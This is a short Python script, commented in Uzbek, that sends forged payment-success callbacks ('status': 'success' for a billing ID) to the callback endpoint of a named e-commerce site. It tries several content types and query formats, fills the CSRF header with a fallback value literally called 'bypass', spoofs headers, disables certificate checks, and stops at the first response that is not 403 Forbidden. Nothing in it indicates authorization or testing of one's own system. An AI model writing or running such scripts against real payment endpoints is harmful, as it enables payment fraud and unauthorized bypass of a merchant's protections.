import requests
import json

def test_different_payloads():
    """Turli xil payload formatlarini sinab ko'rish"""
    url = "https://china-asic.com/callback/"
    
    session = requests.Session()
    
    # Avval sahifaga kirish
    session.get("https://china-asic.com", verify=False, timeout=5)
    
    # Turli xil payloadlar
    payloads = [
        # 1. Oddiy JSON
        {
            "billing_id": "TEST_ID_001",
            "status": "success"
        },
        
        # 2. FormData style
        {
            "billing_id": "TEST_ID_001",
            "status": "success",
            "csrfmiddlewaretoken": "test_token"
        },
        
        # 3. Query parameters bilan
        None  # URL'ga query qo'shamiz
    ]
    
    # Turli xil Content-Type lar
    content_types = [
        "application/json",
        "application/x-www-form-urlencoded",
        "multipart/form-data"
    ]
    
    for i, payload in enumerate(payloads, 1):
        for j, content_type in enumerate(content_types, 1):
            print(f"\n🧪 Test {i}.{j}: {content_type}")
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": content_type,
                "X-CSRFToken": session.cookies.get('csrftoken', 'bypass'),
                "Referer": "https://china-asic.com"
            }
            
            try:
                if payload is None:
                    # URL parametrlari bilan
                    params = {
                        "billing_id": "TEST_ID_001",
                        "status": "success"
                    }
                    response = session.post(
                        url,
                        params=params,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                elif content_type == "application/json":
                    response = session.post(
                        url,
                        json=payload,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                else:
                    response = session.post(
                        url,
                        data=payload,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                
                print(f"Status: {response.status_code}")
                if response.status_code != 403:
                    print(f"✅ Muvaffaqiyatli!")
                    print(f"Response: {response.text[:200]}")
                    return
                else:
                    print(f"❌ 403 Forbidden")
                    
            except Exception as e:
                print(f"❌ Xatolik: {e}")

if __name__ == "__main__":
    test_different_payloads()